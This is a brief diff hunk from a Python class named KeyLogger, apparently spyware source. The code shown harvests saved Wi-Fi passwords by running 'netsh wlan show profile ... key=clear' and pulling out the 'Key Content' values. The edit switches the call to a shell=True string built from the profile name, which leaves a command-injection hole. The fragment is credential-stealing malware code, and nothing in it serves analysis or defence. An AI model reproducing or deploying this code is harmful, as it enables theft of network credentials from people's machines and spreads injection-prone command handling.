@@ -46,7 +46,7 @@ class KeyLogger():
             logs.write("\n----------------------------------------------")
             for profile in profiles:
                 try:
-                    regs = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'])
+                    regs = subprocess.check_output('netsh wlan show profile {} key=clear'.format(profile),shell=True)
                     regs = regs.decode('utf-8', errors ="backslashreplace")
                     regs = regs.split('\n')
                     passwords = [b.split(":")[1][1:-1] for b in regs if "Key Content" in b]
